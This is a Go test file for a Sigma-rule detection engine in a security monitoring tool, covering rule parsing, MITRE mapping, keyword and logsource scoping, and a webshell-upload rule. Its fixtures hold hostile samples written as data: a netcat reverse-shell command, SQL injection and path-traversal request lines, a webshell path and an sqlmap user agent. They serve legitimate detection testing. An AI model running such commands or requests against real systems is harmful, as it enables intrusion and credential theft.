package sigma

import (
	"os"
	"testing"

	"deuswatch/internal/ingest"
)

func mustParse(t *testing.T, y string) *Rule {
	t.Helper()
	r, err := ParseRule([]byte(y))
	if err != nil {
		t.Fatalf("ParseRule: %v", err)
	}
	return r
}

// Loads the real Sigma rule from file + MITRE extraction + DCS mapping.
func TestRealRuleFileSSHRoot(t *testing.T) {
	data, err := os.ReadFile("../../../rules/sigma/ssh_login_root.yml")
	if err != nil {
		t.Fatalf("read rule: %v", err)
	}
	r := mustParse(t, string(data))

	tech, tactic := r.MITRE()
	if tech != "T1078.003" || tactic != "Persistence" {
		t.Fatalf("wrong MITRE: %q / %q", tech, tactic)
	}
	if r.Severity() != ingest.SeverityMedium {
		t.Fatalf("wrong severity: %v", r.Severity())
	}

	rootLogin := FlattenEvent(&ingest.Event{
		Event:  ingest.EventFields{Dataset: "sshd", Action: "ssh_login", Outcome: "success"},
		User:   &ingest.User{Name: "root"},
		Source: &ingest.Endpoint{IP: "203.0.113.10"},
	})
	if ok, err := r.Matches(rootLogin); err != nil || !ok {
		t.Fatalf("a successful root login should match (ok=%v err=%v)", ok, err)
	}

	// a different user / different outcome does not match
	for _, ev := range []map[string]any{
		FlattenEvent(&ingest.Event{Event: ingest.EventFields{Dataset: "sshd", Action: "ssh_login", Outcome: "success"}, User: &ingest.User{Name: "deploy"}}),
		FlattenEvent(&ingest.Event{Event: ingest.EventFields{Dataset: "sshd", Action: "ssh_login", Outcome: "failure"}, User: &ingest.User{Name: "root"}}),
	} {
		if ok, _ := r.Matches(ev); ok {
			t.Fatalf("this event should NOT match: %v", ev)
		}
	}
	t.Logf("OK: real Sigma rule parsed & matched; MITRE %s/%s", tech, tactic)
}

func TestRealRuleFIMChange(t *testing.T) {
	data, err := os.ReadFile("../../../rules/sigma/fim_file_change.yml")
	if err != nil {
		t.Fatalf("read rule: %v", err)
	}
	r := mustParse(t, string(data))

	modified := FlattenEvent(&ingest.Event{
		Event: ingest.EventFields{Category: "file", Action: "file_modified"},
		File:  &ingest.File{Path: "/etc/passwd"},
	})
	if ok, err := r.Matches(modified); err != nil || !ok {
		t.Fatalf("file_modified should match (ok=%v err=%v)", ok, err)
	}
	created := FlattenEvent(&ingest.Event{
		Event: ingest.EventFields{Category: "file", Action: "file_created"},
		File:  &ingest.File{Path: "/tmp/new"},
	})
	if ok, _ := r.Matches(created); ok {
		t.Fatal("file_created must not trigger (only modified/deleted)")
	}
}

func TestModifierContains(t *testing.T) {
	r := mustParse(t, `
title: Reverse shell via netcat
level: high
detection:
  selection:
    process.command_line|contains: 'nc -e'
  condition: selection
tags: [attack.t1059]`)

	hit := FlattenEvent(&ingest.Event{Process: &ingest.Process{Name: "nc", CommandLine: "/usr/bin/nc -e /bin/sh 10.0.0.1 4444"}})
	if ok, err := r.Matches(hit); err != nil || !ok {
		t.Fatalf("a command_line with 'nc -e' should match (ok=%v err=%v)", ok, err)
	}
	miss := FlattenEvent(&ingest.Event{Process: &ingest.Process{CommandLine: "ls -la"}})
	if ok, _ := r.Matches(miss); ok {
		t.Fatal("an ordinary command must not match")
	}
}

func TestConditionAndNotFilter(t *testing.T) {
	r := mustParse(t, `
title: Failed SSH excluding scanner
level: low
detection:
  selection:
    event.dataset: sshd
    event.outcome: failure
  filter:
    user.name: monitoring
  condition: selection and not filter
tags: [attack.t1110]`)

	attacker := FlattenEvent(&ingest.Event{Event: ingest.EventFields{Dataset: "sshd", Outcome: "failure"}, User: &ingest.User{Name: "root"}})
	if ok, _ := r.Matches(attacker); !ok {
		t.Fatal("a failure from root should match (not a scanner)")
	}
	scanner := FlattenEvent(&ingest.Event{Event: ingest.EventFields{Dataset: "sshd", Outcome: "failure"}, User: &ingest.User{Name: "monitoring"}})
	if ok, _ := r.Matches(scanner); ok {
		t.Fatal("a failure from 'monitoring' should be excluded by the filter")
	}
}

func TestConditionOneOfThem(t *testing.T) {
	r := mustParse(t, `
title: Multi selection
level: medium
detection:
  sel_a:
    event.action: ssh_login
  sel_b:
    process.name: nc
  condition: 1 of them`)

	if ok, _ := r.Matches(FlattenEvent(&ingest.Event{Event: ingest.EventFields{Action: "ssh_login"}})); !ok {
		t.Fatal("sel_a matches -> '1 of them' should be true")
	}
	if ok, _ := r.Matches(FlattenEvent(&ingest.Event{Process: &ingest.Process{Name: "nc"}})); !ok {
		t.Fatal("sel_b matches -> '1 of them' should be true")
	}
	if ok, _ := r.Matches(FlattenEvent(&ingest.Event{Event: ingest.EventFields{Action: "logout"}})); ok {
		t.Fatal("none match -> should be false")
	}
}

func TestAggregationRejected(t *testing.T) {
	_, err := ParseRule([]byte(`
title: brute force
detection:
  selection:
    event.outcome: failure
  condition: selection | count() by source.ip > 5`))
	if err == nil {
		t.Fatal("an aggregation condition should be rejected (routed to the SQL path)")
	}
}

func TestKeywordSelection(t *testing.T) {
	r := mustParse(t, `
title: Break-in
level: low
detection:
  keywords:
    - 'POSSIBLE BREAK-IN ATTEMPT'
  condition: keywords
tags: [attack.t1595]`)

	hit := FlattenEvent(&ingest.Event{Event: ingest.EventFields{
		Dataset:  "sshd",
		Original: "Address 1.2.3.4 maps to evil.example, but this does not map back - POSSIBLE BREAK-IN ATTEMPT!",
	}})
	if ok, err := r.Matches(hit); err != nil || !ok {
		t.Fatalf("the keyword rule should match: ok=%v err=%v", ok, err)
	}
	miss := FlattenEvent(&ingest.Event{Event: ingest.EventFields{Dataset: "sshd", Original: "Accepted password for root"}})
	if ok, _ := r.Matches(miss); ok {
		t.Fatal("an ordinary log line must not match the keyword")
	}
}

// TestKeywordScopedToOriginal proves a keyword rule matches ONLY the raw log line
// (event.original), not other structured fields. This kills the false-positive class where a
// short/leetspeak judi keyword (e.g. '5107' = "slot") collides with an IP octet or port, and
// stops synthetic detect events (no event.original) from self-triggering keyword rules.
func TestKeywordScopedToOriginal(t *testing.T) {
	r := mustParse(t, `
title: Judi keyword
level: high
logsource:
  category: web
detection:
  keywords:
    - '5107'
  condition: keywords
tags: [attack.t1491.002]`)

	// A real web access line carrying the term in the URL -> match.
	webHit := FlattenEvent(&ingest.Event{
		Event:  ingest.EventFields{Category: "web", Original: `1.2.3.4 - - "GET /5107-gacor HTTP/1.1" 200`},
		Source: &ingest.Endpoint{IP: "1.2.3.4"},
	})
	if ok, err := r.Matches(webHit); err != nil || !ok {
		t.Fatalf("web line containing the keyword should match (ok=%v err=%v)", ok, err)
	}
	// Same digits appear only in the source IP (85.107.x) - must NOT match: keywords scan
	// event.original, not the flattened fields.
	ipOnly := FlattenEvent(&ingest.Event{
		Event:  ingest.EventFields{Category: "web", Original: `85.107.9.9 - - "GET /index.html HTTP/1.1" 200`},
		Source: &ingest.Endpoint{IP: "85.107.9.9"},
	})
	if ok, _ := r.Matches(ipOnly); ok {
		t.Fatal("digits present only in the IP (not the URL) must not match a keyword rule")
	}
	// A synthetic detection event has no event.original -> must never keyword-match.
	synthetic := FlattenEvent(&ingest.Event{Event: ingest.EventFields{
		Category: "intrusion_detection", Dataset: "deuswatch.detect",
	}})
	if ok, _ := r.Matches(synthetic); ok {
		t.Fatal("a synthetic detect event (no event.original) must not keyword-match")
	}
}

// TestLogsourceScoping proves a rule is placed on its real source: a web rule does not run on
// an sshd line even if that line contains the keyword, and a FIM rule does not run on web.
func TestLogsourceScoping(t *testing.T) {
	web := mustParse(t, `
title: Judi keyword
level: high
logsource:
  category: web
detection:
  keywords:
    - 'gacor'
  condition: keywords
tags: [attack.t1491.002]`)

	// An sshd auth line that happens to contain "gacor" (e.g. a username) is out of scope.
	sshLine := FlattenEvent(&ingest.Event{Event: ingest.EventFields{
		Category: "authentication", Dataset: "sshd",
		Original: "Failed password for gacor from 1.2.3.4 port 22 ssh2",
	}})
	if web.AppliesTo(sshLine) {
		t.Fatal("a category:web rule must not apply to an authentication event")
	}
	// The same content on a real web event is in scope and matches.
	webLine := FlattenEvent(&ingest.Event{Event: ingest.EventFields{
		Category: "web", Original: `1.2.3.4 - - "GET /gacor HTTP/1.1" 200`,
	}})
	if !web.AppliesTo(webLine) {
		t.Fatal("a category:web rule must apply to a web event")
	}
	if ok, _ := web.Matches(webLine); !ok {
		t.Fatal("the web keyword should match on a web event")
	}

	// A FIM rule (file_event) must not apply to a web event.
	fim := mustParse(t, `
title: FIM etc
level: high
logsource:
  product: linux
  category: file_event
detection:
  selection:
    file.path|contains: '/etc/'
  condition: selection`)
	if fim.AppliesTo(webLine) {
		t.Fatal("a category:file_event rule must not apply to a web event")
	}
	fileEvent := FlattenEvent(&ingest.Event{
		Event: ingest.EventFields{Category: "file", Action: "file_modified"},
		Host:  &ingest.Host{Name: "h1", OSType: "linux"},
		File:  &ingest.File{Path: "/etc/passwd"},
	})
	if !fim.AppliesTo(fileEvent) {
		t.Fatal("a category:file_event/product:linux rule must apply to a linux file event")
	}
}

// TestWebshellUploadContainmentRule locks in the boss requirement: a PHP file dropped in a web
// upload dir fires the rule, carries the network_containment directive, and applies only to
// file events - while a legit image upload or a .php outside an upload dir does NOT fire.
func TestWebshellUploadContainmentRule(t *testing.T) {
	data, err := os.ReadFile("../../../rules/sigma/webshell_upload_containment.yml")
	if err != nil {
		t.Fatalf("read rule: %v", err)
	}
	r := mustParse(t, string(data))
	if r.Mitigation == nil || r.Mitigation.ActionType != "network_containment" {
		t.Fatalf("rule must authorize network_containment, got %+v", r.Mitigation)
	}

	drop := FlattenEvent(&ingest.Event{
		Event: ingest.EventFields{Category: "file", Action: "file_created"},
		Host:  &ingest.Host{Name: "web01", OSType: "linux"},
		File:  &ingest.File{Path: "/var/www/html/wp-content/uploads/2026/shell.php"},
	})
	if !r.AppliesTo(drop) {
		t.Fatal("rule should apply to a linux file event")
	}
	if ok, err := r.Matches(drop); err != nil || !ok {
		t.Fatalf("a .php dropped in uploads should match (ok=%v err=%v)", ok, err)
	}

	// A legit image upload must NOT fire.
	img := FlattenEvent(&ingest.Event{
		Event: ingest.EventFields{Category: "file", Action: "file_created"},
		File:  &ingest.File{Path: "/var/www/html/wp-content/uploads/2026/photo.jpg"},
	})
	if ok, _ := r.Matches(img); ok {
		t.Fatal("a .jpg upload must not match the webshell rule")
	}
	// A .php outside an upload dir (e.g. a normal app deploy) must NOT fire this rule.
	deploy := FlattenEvent(&ingest.Event{
		Event: ingest.EventFields{Category: "file", Action: "file_modified"},
		File:  &ingest.File{Path: "/var/www/html/index.php"},
	})
	if ok, _ := r.Matches(deploy); ok {
		t.Fatal("a .php outside an upload dir must not match this (deploy-safe) rule")
	}
}

// TestAuthoredRuleSetsFireAndScope loads the hand-authored auth + web-attack rule dirs and
// checks they fire on real attack log lines, stay quiet on benign traffic, and respect
// logsource scope (a web rule must not run on an sshd line and vice-versa).
func TestAuthoredRuleSetsFireAndScope(t *testing.T) {
	web, err := LoadDir("../../../rules/sigma/web-attack")
	if err != nil || len(web) == 0 {
		t.Fatalf("load web-attack rules: %v (n=%d)", err, len(web))
	}
	auth, err := LoadDir("../../../rules/sigma/auth")
	if err != nil || len(auth) == 0 {
		t.Fatalf("load auth rules: %v (n=%d)", err, len(auth))
	}

	webEvent := func(line string) map[string]any {
		return FlattenEvent(&ingest.Event{Event: ingest.EventFields{Category: "web", Original: line}})
	}
	authEvent := func(line string) map[string]any {
		return FlattenEvent(&ingest.Event{Event: ingest.EventFields{Category: "authentication", Original: line}})
	}

	// Web attacks fire.
	for _, line := range []string{
		`1.2.3.4 - - "GET /p?id=1 UNION SELECT username,password FROM users HTTP/1.1" 200`,
		`1.2.3.4 - - "GET /?file=../../../../etc/passwd HTTP/1.1" 200`,
		`1.2.3.4 - - "GET / HTTP/1.1" 200 "-" "sqlmap/1.7"`,
		`1.2.3.4 - - "GET /wp-content/uploads/c99.php HTTP/1.1" 200`,
		`1.2.3.4 - - "GET /.env HTTP/1.1" 404`,
	} {
		if len(web.Match(webEvent(line))) == 0 {
			t.Fatalf("expected a web-attack rule to fire on: %s", line)
		}
	}
	// Benign web traffic stays quiet.
	if n := len(web.Match(webEvent(`8.8.8.8 - - "GET /index.html HTTP/1.1" 200 1024 "-" "Mozilla/5.0"`))); n != 0 {
		t.Fatalf("benign web request should not match any web-attack rule (got %d)", n)
	}
	// A web rule must not run on an sshd line (logsource scope).
	if n := len(web.Match(authEvent("Failed password for root from 1.2.3.4 port 22 ssh2"))); n != 0 {
		t.Fatalf("web-attack rules must not fire on an authentication event (got %d)", n)
	}

	// Auth signatures fire.
	if len(auth.Match(authEvent("reverse mapping checking getaddrinfo failed - POSSIBLE BREAK-IN ATTEMPT!"))) == 0 {
		t.Fatal("expected an auth rule to fire on a break-in attempt line")
	}
	if len(auth.Match(authEvent("Did not receive identification string from 1.2.3.4"))) == 0 {
		t.Fatal("expected an auth rule to fire on a scanner line")
	}
	// Benign auth line stays quiet.
	if n := len(auth.Match(authEvent("Accepted password for deploy from 10.0.0.5 port 22 ssh2"))); n != 0 {
		t.Fatalf("a normal accepted login should not match these auth rules (got %d)", n)
	}
}

func TestFieldAlias(t *testing.T) {
	r := mustParse(t, `
title: Alias test
level: low
detection:
  selection:
    User: root
    src_ip: 203.0.113.10
  condition: selection`)

	ev := FlattenEvent(&ingest.Event{
		User:   &ingest.User{Name: "root"},
		Source: &ingest.Endpoint{IP: "203.0.113.10"},
	})
	if ok, err := r.Matches(ev); err != nil || !ok {
		t.Fatalf("the User/src_ip aliases should resolve to DCS: ok=%v err=%v", ok, err)
	}
}
